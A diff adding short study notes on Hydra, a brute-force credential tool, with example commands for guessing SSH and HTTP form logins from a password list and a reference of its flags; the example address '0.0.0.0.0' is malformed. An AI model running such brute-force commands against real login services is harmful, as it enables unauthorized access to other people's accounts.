@@ -1,0 +1,22 @@
+Hydra- a brute force credential tool
+
+hydra -l username -P passwords.txt <target> <protocol>
+
+Example of a ssh login:
+  hydra -l admin -P passwords.txt 0.0.0.0.0 ssh
+
+example of a http login:
+  hydra -l admin -P passwords.txt 0.0.0.0.0 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+      
+      /login.php -> login page
+      user=^USER^&pass=^PASS^ -> form fields
+      F=incorrect -> failure
+
+-l -> single username
+-L -> username list
+-p -> single password
+-P -> password list
+-t -> number of threads (speed)
+-V -> verbose (shows each attempt)
+-f -> stop after first valid login
+-s -> specify port
